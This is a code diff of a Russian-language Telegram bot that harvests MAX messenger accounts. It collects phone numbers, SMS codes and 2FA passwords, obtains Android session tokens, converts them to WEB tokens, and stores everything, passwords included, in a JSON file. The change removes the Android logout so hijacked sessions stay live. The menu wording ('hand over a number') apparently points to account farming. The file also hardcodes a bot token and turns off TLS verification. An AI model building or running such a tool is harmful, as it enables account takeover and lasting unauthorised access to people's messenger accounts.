@@ -9,12 +9,14 @@ import socket
 import struct
 import msgpack
 import threading
+from io import BytesIO
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.types import BufferedInputFile
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import InlineKeyboardButton
 
 try:
     import lz4.block
@@ -30,13 +32,12 @@ except ImportError:
 # ==================== КОНФИГ ====================
 
 BOT_TOKEN = "8637559797:AAEMxPOzFA00IGB1jEBR6R3BAj39s2Xy2HY"
-ADMIN_ID = 6769546065  # Ваш Telegram ID
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# ==================== MAX PROTOCOL (Android) ====================
+# ==================== MAX PROTOCOL ====================
 
 class Packet:
     VERSION = 10
@@ -725,69 +726,16 @@ class WebQRDeviceLink:
             except:
                 pass
 
-# ==================== LOGOUT ANDROID ====================
-
-def logout_android(token: str, device_id: str) -> bool:
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(10)
-        sock.connect(("api.oneme.ru", 443))
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        sock = ctx.wrap_socket(sock, server_hostname="api.oneme.ru")
-
-        sock.sendall(Packet(Opcode.SESSION_INIT, pack({
-            "clientSessionId": 2,
-            "mt_instanceid": uuid.uuid4().hex,
-            "userAgent": {
-                "deviceType": "ANDROID", "appVersion": "26.16.4",
-                "osVersion": "Android 10", "timezone": "Europe/Moscow",
-                "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
-                "arch": "arm64-v8a", "locale": "ru",
-                "buildNumber": 6704, "deviceName": "Google Pixel 7",
-                "deviceLocale": "ru"
-            },
-            "deviceId": device_id
-        })).to_bytes())
-        time.sleep(0.5)
-
-        sock.sendall(Packet(Opcode.LOGIN, pack({
-            "token": token, "deviceId": device_id,
-            "userAgent": {
-                "deviceType": "ANDROID", "appVersion": "26.16.4",
-                "osVersion": "Android 10", "timezone": "Europe/Moscow",
-                "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
-                "arch": "arm64-v8a", "locale": "ru",
-                "buildNumber": 6704, "deviceName": "Google Pixel 7",
-                "deviceLocale": "ru"
-            }
-        })).to_bytes())
-        time.sleep(1)
-
-        sock.sendall(Packet(Opcode.LOGOUT, pack({})).to_bytes())
-        time.sleep(0.5)
-        sock.close()
-        return True
-    except Exception as e:
-        logging.error(f"[LOGOUT] Error: {e}")
-        return False
-
 # ==================== КОНВЕРТАЦИЯ ANDROID → WEB ====================
 
 def convert_android_to_web(android_token: str, device_id: str = None, 
                            phone: str = None, password: str = None) -> dict:
-    """
-    Конвертирует Android токен в WEB токен
-    Возвращает словарь с результатом в том же формате, что и в accounts.json
-    """
     result = {
         "success": False,
         "web_token": None,
         "device_id": device_id or "unknown",
         "qr_data": None,
-        "error": None,
-        "token": android_token  # сохраняем оригинальный токен
+        "error": None
     }
 
     qr_link = WebQRDeviceLink(phone=phone, password=password)
@@ -843,8 +791,8 @@ def convert_android_to_web(android_token: str, device_id: str = None,
     if qr_link.login_complete.is_set() and qr_link.token:
         result["success"] = True
         result["web_token"] = qr_link.token
-        logging.info("[CONVERT] Logging out from Android...")
-        logout_android(android_token, device_id or qr_link.device_id)
+        logging.info("[CONVERT] WEB token obtained successfully")
+        # НЕ разлогиниваем Android - удалён вызов logout_android
     elif qr_link.password_required.is_set():
         result["error"] = "2FA_PASSWORD_REQUIRED"
     else:
@@ -853,27 +801,38 @@ def convert_android_to_web(android_token: str, device_id: str = None,
     qr_link.close()
     return result
 
-# ==================== СОСТОЯНИЯ ====================
+# ==================== ДАННЫЕ ====================
 
 class AuthState(StatesGroup):
-    waiting_for_phone = State()
     waiting_for_code = State()
     waiting_for_password = State()
 
-# Хранилище сессий
 pending = {}
+accounts = {}
+ACCOUNTS_FILE = "accounts.json"
+
+def load_data():
+    global accounts
+    if os.path.exists(ACCOUNTS_FILE):
+        with open(ACCOUNTS_FILE, "r") as f:
+            accounts = json.load(f)
+
+def save_data():
+    with open(ACCOUNTS_FILE, "w") as f:
+        json.dump(accounts, f, ensure_ascii=False, indent=4)
+
+load_data()
 
 # ==================== КЛАВИАТУРЫ ====================
 
-def get_main_keyboard():
+def back_keyboard():
     builder = InlineKeyboardBuilder()
-    builder.row(InlineKeyboardButton(text="📱 Получить токен", callback_data="get_token"))
-    builder.row(InlineKeyboardButton(text="🔄 Конвертировать в WEB", callback_data="convert_web"))
+    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="menu"))
     return builder.as_markup()
 
-def get_back_keyboard():
+def menu_keyboard():
     builder = InlineKeyboardBuilder()
-    builder.row(InlineKeyboardButton(text="🔙 Отмена", callback_data="cancel"))
+    builder.row(InlineKeyboardButton(text="📱 Сдать номер", callback_data="add_account"))
     return builder.as_markup()
 
 # ==================== ХЕНДЛЕРЫ ====================
@@ -882,54 +841,50 @@ def get_back_keyboard():
 async def start_handler(message: types.Message):
     await message.answer(
         "🤖 <b>Бот для получения токенов</b>\n\n"
-        "📱 <b>Получить токен</b> - авторизация номера через SMS\n"
-        "🔄 <b>Конвертировать в WEB</b> - конвертация Android токена в WEB\n\n"
-        "Форматы токенов такие же как в основном боте:\n"
-        "<code>token, device_id, web_token, password</code>\n\n"
-        "Выберите действие:",
+        "📱 <b>Сдать номер</b> - получить Android + WEB токены\n"
+        "Бот автоматически получает Android токен и сразу конвертирует в WEB\n"
+        "Android сессия остаётся активной",
         parse_mode="HTML",
-        reply_markup=get_main_keyboard()
+        reply_markup=menu_keyboard()
     )
 
-@dp.callback_query(F.data == "cancel")
-async def cancel_handler(callback: types.CallbackQuery, state: FSMContext):
-    uid = callback.from_user.id
-    if uid in pending:
-        auth = pending[uid].get("auth")
+@dp.callback_query(F.data == "menu")
+async def cb_menu(callback: types.CallbackQuery, state: FSMContext):
+    await state.clear()
+    if callback.from_user.id in pending:
+        auth = pending[callback.from_user.id].get("auth")
         if auth:
             auth.close()
-        del pending[uid]
-    await state.clear()
-    await callback.message.edit_text("❌ Действие отменено", reply_markup=get_main_keyboard())
-    await callback.answer()
-
-@dp.callback_query(F.data == "get_token")
-async def get_token_handler(callback: types.CallbackQuery, state: FSMContext):
-    await state.set_state(AuthState.waiting_for_phone)
+        del pending[callback.from_user.id]
     await callback.message.edit_text(
-        "📱 Отправьте номер телефона в формате <b>+79111111111</b>",
+        "🤖 <b>Бот для получения токенов</b>\n\n"
+        "📱 <b>Сдать номер</b> - получить Android + WEB токены",
         parse_mode="HTML",
-        reply_markup=get_back_keyboard()
+        reply_markup=menu_keyboard()
     )
     await callback.answer()
 
-@dp.message(AuthState.waiting_for_phone, F.text.regexp(r'^\+7\d{10}$'))
+@dp.callback_query(F.data == "add_account")
+async def cb_add_account(callback: types.CallbackQuery, state: FSMContext):
+    await state.clear()
+    await state.set_state(AuthState.waiting_for_code)
+    await callback.message.edit_text(
+        "📱 Отправьте номер в формате +79111111111",
+        reply_markup=back_keyboard()
+    )
+    await callback.answer()
+
+@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\+7\d{10}$'))
 async def phone_handler(message: types.Message, state: FSMContext):
     phone = message.text.strip()
     uid = message.from_user.id
-    
-    # Очищаем предыдущую сессию если есть
-    if uid in pending:
-        old_auth = pending[uid].get("auth")
-        if old_auth:
-            old_auth.close()
-    
+
     auth = MaxAuth()
     pending[uid] = {"auth": auth, "phone": phone, "status": "waiting_sms"}
     await state.update_data(phone=phone)
-    
+
     msg = await message.answer("⏳ Подключаюсь к серверу...")
-    
+
     def do_auth():
         try:
             if not auth.connect():
@@ -943,46 +898,42 @@ async def phone_handler(message: types.Message, state: FSMContext):
             pending[uid]["status"] = "sms_sent"
         except Exception as e:
             pending[uid]["status"] = f"error:{e}"
-    
+
     threading.Thread(target=do_auth, daemon=True).start()
     await asyncio.sleep(5)
-    
+
     if uid not in pending:
         return
-    
+
     status = pending[uid].get("status", "")
-    
+
     if status == "sms_sent":
-        await state.set_state(AuthState.waiting_for_code)
         await msg.edit_text("✅ SMS отправлена. Введите код из 6 цифр:")
     elif status and status.startswith("error:"):
         err_text = status[6:]
-        await msg.edit_text(f"❌ Ошибка: {err_text}", reply_markup=get_main_keyboard())
+        await msg.edit_text(f"❌ {err_text}", reply_markup=menu_keyboard())
         auth.close()
         del pending[uid]
         await state.clear()
     else:
-        await state.set_state(AuthState.waiting_for_code)
         await msg.edit_text("⏳ Ожидание SMS... Введите код из 6 цифр:")
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     if uid not in pending:
-        await message.answer("⏳ Сессия устарела. Нажмите /start")
-        return
-    
+        return await message.answer("⏳ Сессия устарела. /start")
+
     data = await state.get_data()
     phone = data.get("phone", "")
     code = message.text.strip()
     auth = pending[uid].get("auth")
-    
+
     if not auth:
-        await message.answer("⏳ Сессия устарела. Нажмите /start")
-        return
-    
+        return await message.answer("⏳ Сессия устарела. /start")
+
     msg = await message.answer("⏳ Проверяю код...")
-    
+
     result = None
     def do_verify():
         nonlocal result
@@ -990,37 +941,37 @@ async def code_handler(message: types.Message, state: FSMContext):
             result = auth.verify_code(code)
         except Exception as e:
             result = {"error": str(e)}
-    
+
     threading.Thread(target=do_verify, daemon=True).start()
     await asyncio.sleep(3)
-    
+
     if not result:
         await asyncio.sleep(5)
-    
+
     if not result:
-        await msg.edit_text("❌ Таймаут проверки кода.", reply_markup=get_main_keyboard())
+        await msg.edit_text("❌ Таймаут проверки кода.", reply_markup=menu_keyboard())
         auth.close()
         del pending[uid]
         await state.clear()
         return
-    
+
     if "error" in result:
         err = str(result["error"]).lower()
         if "wrong" in err or "invalid" in err:
             await msg.edit_text("❌ Неверный код. Попробуйте ещё раз.")
             return
-        await msg.edit_text(f"❌ Ошибка: {result['error']}", reply_markup=get_main_keyboard())
+        await msg.edit_text(f"❌ Ошибка: {result['error']}", reply_markup=menu_keyboard())
         auth.close()
         del pending[uid]
         await state.clear()
         return
-    
+
     if result.get("needs_password"):
         pending[uid]["track_id"] = auth.track_id
         await state.set_state(AuthState.waiting_for_password)
-        await msg.edit_text("🔐 Требуется пароль 2FA. Введите пароль:")
+        await msg.edit_text("🔐 Введите пароль 2FA:")
         return
-    
+
     if result.get("needs_registration"):
         pending[uid]["status"] = "registering"
         pending[uid]["auth_token"] = auth.auth_token
@@ -1045,7 +996,7 @@ async def code_handler(message: types.Message, state: FSMContext):
                     pending[uid]["status"] = f"error:{reg_result.get('error', 'registration_failed')}"
             except Exception as e:
                 pending[uid]["status"] = f"error:{e}"
-        
+
         threading.Thread(target=do_register, daemon=True).start()
         await msg.edit_text("⏳ Регистрирую аккаунт...")
         
@@ -1057,52 +1008,97 @@ async def code_handler(message: types.Message, state: FSMContext):
             if status == "done":
                 break
             if status and status.startswith("error:"):
-                await msg.edit_text(f"❌ {status[6:]}", reply_markup=get_main_keyboard())
+                await msg.edit_text(f"❌ {status[6:]}", reply_markup=menu_keyboard())
                 auth.close()
                 del pending[uid]
                 await state.clear()
                 return
         
         if pending[uid].get("status") != "done":
-            await msg.edit_text("❌ Таймаут регистрации.", reply_markup=get_main_keyboard())
+            await msg.edit_text("❌ Таймаут регистрации.", reply_markup=menu_keyboard())
             auth.close()
             del pending[uid]
             await state.clear()
             return
-    
+
     if result.get("token"):
         pending[uid]["token"] = result["token"]
         pending[uid]["device_id"] = auth.device_id
         pending[uid]["status"] = "done"
-    
+
     if pending[uid].get("status") == "done":
         token = pending[uid]["token"]
         device_id = pending[uid].get("device_id", "")
         
-        # Формат как в accounts.json оригинального бота
-        account_data = {
+        # Сохраняем Android токен
+        uid_str = str(uid)
+        if uid_str not in accounts:
+            accounts[uid_str] = {}
+        accounts[uid_str][phone] = {
             "token": token,
-            "device_id": device_id,
             "web_token": None,
+            "device_id": device_id,
             "user_id": 0,
             "password": ""
         }
+        save_data()
         
-        await msg.edit_text(
-            f"✅ <b>Токен получен!</b>\n\n"
-            f"📱 Телефон: <code>{phone}</code>\n\n"
-            f"📦 <b>Данные аккаунта:</b>\n"
-            f"<pre>{json.dumps(account_data, indent=2, ensure_ascii=False)}</pre>\n\n"
-            f"Можно скопировать и использовать для конвертации в WEB.",
-            parse_mode="HTML",
-            reply_markup=get_main_keyboard()
+        # Отправляем Android токен
+        android_data = json.dumps(accounts[uid_str][phone], indent=2, ensure_ascii=False)
+        android_filename = f"ANDROID_{phone.replace('+', '')}.txt"
+        
+        await msg.edit_text("✅ Android токен получен! Конвертирую в WEB...")
+        await message.answer_document(
+            BufferedInputFile(android_data.encode('utf-8'), filename=android_filename),
+            caption=f"✅ ANDROID токен для {phone}\n⚠️ Сохраните, сессия остаётся активной"
         )
+        
+        # Конвертируем в WEB (без разлогина Android)
+        new_msg = await message.answer("🔄 Конвертирую в WEB токен...")
+        
+        def do_convert():
+            return convert_android_to_web(token, device_id, phone, None)
+        
+        result = await asyncio.to_thread(do_convert)
+        
+        if result["success"] and result["web_token"]:
+            # Обновляем web_token
+            accounts[uid_str][phone]["web_token"] = result["web_token"]
+            save_data()
+            
+            # Отправляем WEB токен
+            web_data = json.dumps(accounts[uid_str][phone], indent=2, ensure_ascii=False)
+            web_filename = f"WEB_{phone.replace('+', '')}.txt"
+            
+            await new_msg.edit_text("✅ Конвертация успешна! Отправляю WEB токен...")
+            await message.answer_document(
+                BufferedInputFile(web_data.encode('utf-8'), filename=web_filename),
+                caption=f"✅ WEB токен для {phone}\nAndroid сессия остаётся активной"
+            )
+            
+            await message.answer(
+                f"🎉 <b>Готово!</b>\n\n"
+                f"📱 Телефон: {phone}\n"
+                f"✅ Android токен получен (сессия активна)\n"
+                f"✅ WEB токен получен\n\n"
+                f"Оба токена сохранены в файлах выше",
+                parse_mode="HTML",
+                reply_markup=menu_keyboard()
+            )
+        else:
+            error = result.get("error", "Неизвестная ошибка")
+            await new_msg.edit_text(
+                f"⚠️ Android токен получен (сессия активна), но конвертация не удалась: {error}\n"
+                f"WEB токен можно получить позже.",
+                reply_markup=menu_keyboard()
+            )
+        
         auth.close()
         del pending[uid]
         await state.clear()
         return
-    
-    await msg.edit_text("❌ Неизвестная ошибка.", reply_markup=get_main_keyboard())
+
+    await msg.edit_text("❌ Неизвестная ошибка.", reply_markup=menu_keyboard())
     auth.close()
     del pending[uid]
     await state.clear()
@@ -1111,20 +1107,18 @@ async def code_handler(message: types.Message, state: FSMContext):
 async def password_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     if uid not in pending:
-        await message.answer("⏳ Сессия устарела. Нажмите /start")
-        return
-    
+        return await message.answer("⏳ Сессия устарела. /start")
+
     data = await state.get_data()
     phone = data.get("phone", "")
     pwd = message.text.strip()
     auth = pending[uid].get("auth")
-    
+
     if not auth:
-        await message.answer("⏳ Сессия устарела. Нажмите /start")
-        return
-    
+        return await message.answer("⏳ Сессия устарела. /start")
+
     msg = await message.answer("⏳ Проверяю пароль...")
-    
+
     token = None
     def do_check():
         nonlocal token
@@ -1132,152 +1126,81 @@ async def password_handler(message: types.Message, state: FSMContext):
             token = auth.check_password(pwd)
         except:
             pass
-    
+
     threading.Thread(target=do_check, daemon=True).start()
     await asyncio.sleep(3)
-    
+
     if token:
         device_id = auth.device_id
         
-        # Формат как в accounts.json оригинального бота
-        account_data = {
+        # Сохраняем Android токен
+        uid_str = str(uid)
+        if uid_str not in accounts:
+            accounts[uid_str] = {}
+        accounts[uid_str][phone] = {
             "token": token,
-            "device_id": device_id,
             "web_token": None,
+            "device_id": device_id,
             "user_id": 0,
             "password": pwd
         }
+        save_data()
         
-        await msg.edit_text(
-            f"✅ <b>Токен получен!</b>\n\n"
-            f"📱 Телефон: <code>{phone}</code>\n\n"
-            f"📦 <b>Данные аккаунта:</b>\n"
-            f"<pre>{json.dumps(account_data, indent=2, ensure_ascii=False)}</pre>\n\n"
-            f"Можно скопировать и использовать для конвертации в WEB.",
-            parse_mode="HTML",
-            reply_markup=get_main_keyboard()
+        # Отправляем Android токен
+        android_data = json.dumps(accounts[uid_str][phone], indent=2, ensure_ascii=False)
+        android_filename = f"ANDROID_{phone.replace('+', '')}.txt"
+        
+        await msg.edit_text("✅ Android токен получен! Конвертирую в WEB...")
+        await message.answer_document(
+            BufferedInputFile(android_data.encode('utf-8'), filename=android_filename),
+            caption=f"✅ ANDROID токен для {phone}\n⚠️ Сохраните, сессия остаётся активной"
         )
+        
+        # Конвертируем в WEB (без разлогина Android)
+        new_msg = await message.answer("🔄 Конвертирую в WEB токен...")
+        
+        def do_convert():
+            return convert_android_to_web(token, device_id, phone, pwd)
+        
+        result = await asyncio.to_thread(do_convert)
+        
+        if result["success"] and result["web_token"]:
+            # Обновляем web_token
+            accounts[uid_str][phone]["web_token"] = result["web_token"]
+            save_data()
+            
+            # Отправляем WEB токен
+            web_data = json.dumps(accounts[uid_str][phone], indent=2, ensure_ascii=False)
+            web_filename = f"WEB_{phone.replace('+', '')}.txt"
+            
+            await new_msg.edit_text("✅ Конвертация успешна! Отправляю WEB токен...")
+            await message.answer_document(
+                BufferedInputFile(web_data.encode('utf-8'), filename=web_filename),
+                caption=f"✅ WEB токен для {phone}\nAndroid сессия остаётся активной"
+            )
+            
+            await message.answer(
+                f"🎉 <b>Готово!</b>\n\n"
+                f"📱 Телефон: {phone}\n"
+                f"✅ Android токен получен (сессия активна)\n"
+                f"✅ WEB токен получен\n\n"
+                f"Оба токена сохранены в файлах выше",
+                parse_mode="HTML",
+                reply_markup=menu_keyboard()
+            )
+        else:
+            error = result.get("error", "Неизвестная ошибка")
+            await new_msg.edit_text(
+                f"⚠️ Android токен получен (сессия активна), но конвертация не удалась: {error}",
+                reply_markup=menu_keyboard()
+            )
     else:
-        await msg.edit_text("❌ Неверный пароль.", reply_markup=get_main_keyboard())
-    
+        await msg.edit_text("❌ Неверный пароль.", reply_markup=menu_keyboard())
+
     auth.close()
     if uid in pending:
         del pending[uid]
     await state.clear()
-
-@dp.callback_query(F.data == "convert_web")
-async def convert_web_handler(callback: types.CallbackQuery, state: FSMContext):
-    await state.clear()
-    await callback.message.answer(
-        "🔄 <b>Конвертация Android → WEB</b>\n\n"
-        "Отправьте JSON с данными аккаунта (как в выдаче после получения токена):\n\n"
-        "<pre>{\n"
-        '  "token": "ваш_android_токен",\n'
-        '  "device_id": "ваш_device_id",\n'
-        '  "password": "пароль_если_есть"\n'
-        "}</pre>\n\n"
-        "Или просто отправьте токен и device_id через | :\n"
-        "<code>ТОКЕН|DEVICE_ID|ПАРОЛЬ</code>",
-        parse_mode="HTML",
-        reply_markup=get_back_keyboard()
-    )
-    await callback.answer()
-
-@dp.message(F.text.regexp(r'^\{.*\}$'))
-async def convert_json_handler(message: types.Message):
-    """Обработчик JSON формата"""
-    try:
-        data = json.loads(message.text.strip())
-        token = data.get("token")
-        device_id = data.get("device_id")
-        password = data.get("password") or None
-        
-        if not token:
-            await message.answer("❌ В JSON отсутствует поле 'token'")
-            return
-        
-        if not device_id:
-            # Если нет device_id в JSON, генерируем новый
-            device_id = str(uuid.uuid4())
-            await message.answer(f"⚠️ Device ID не указан, создан новый: <code>{device_id}</code>", parse_mode="HTML")
-        
-        await process_conversion(message, token, device_id, password)
-        
-    except json.JSONDecodeError:
-        await message.answer("❌ Неверный JSON формат")
-    except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
-
-@dp.message(F.text.regexp(r'^[^|]+\|[^|]+(\|.*)?$'))
-async def convert_pipe_handler(message: types.Message):
-    """Обработчик формата через |"""
-    parts = message.text.strip().split("|")
-    
-    if len(parts) < 2:
-        await message.answer("❌ Неверный формат.\nНужно: <code>ТОКЕН|DEVICE_ID|ПАРОЛЬ</code>")
-        return
-    
-    token = parts[0].strip()
-    device_id = parts[1].strip()
-    password = parts[2].strip() if len(parts) > 2 and parts[2].strip() else None
-    
-    if not token or not device_id:
-        await message.answer("❌ Токен и Device ID обязательны")
-        return
-    
-    await process_conversion(message, token, device_id, password)
-
-async def process_conversion(message: types.Message, token: str, device_id: str, password: str = None):
-    """Общая функция для конвертации"""
-    msg = await message.answer(f"🔄 Конвертирую Android токен в WEB...")
-    
-    def do_convert():
-        return convert_android_to_web(token, device_id, None, password)
-    
-    result = await asyncio.to_thread(do_convert)
-    
-    if result["success"] and result["web_token"]:
-        # Формат как в accounts.json оригинального бота
-        web_account = {
-            "token": token,  # оригинальный android токен
-            "device_id": device_id,
-            "web_token": result["web_token"],
-            "user_id": 0,
-            "password": password or ""
-        }
-        
-        await msg.edit_text(
-            f"✅ <b>Конвертация успешна!</b>\n\n"
-            f"📦 <b>WEB аккаунт:</b>\n"
-            f"<pre>{json.dumps(web_account, indent=2, ensure_ascii=False)}</pre>\n\n"
-            f"Android токен разлогинен.",
-            parse_mode="HTML",
-            reply_markup=get_main_keyboard()
-        )
-    elif result.get("error") == "2FA_PASSWORD_REQUIRED":
-        await msg.edit_text(
-            "❌ Требуется пароль 2FA!\n"
-            "Отправьте JSON с паролем или через | :\n"
-            "<code>ТОКЕН|DEVICE_ID|ПАРОЛЬ</code>",
-            parse_mode="HTML",
-            reply_markup=get_main_keyboard()
-        )
-    else:
-        error = result.get("error", "Неизвестная ошибка")
-        await msg.edit_text(
-            f"❌ Ошибка конвертации: {error}",
-            reply_markup=get_main_keyboard()
-        )
-
-@dp.message()
-async def fallback_handler(message: types.Message):
-    await message.answer(
-        "Используйте кнопки меню. /start\n\n"
-        "Поддерживаемые форматы для конвертации:\n"
-        "• JSON: <code>{\"token\":\"...\",\"device_id\":\"...\"}</code>\n"
-        "• Pipe: <code>ТОКЕН|DEVICE_ID|ПАРОЛЬ</code>",
-        parse_mode="HTML"
-    )
 
 async def main():
     logging.info("Бот запущен!")
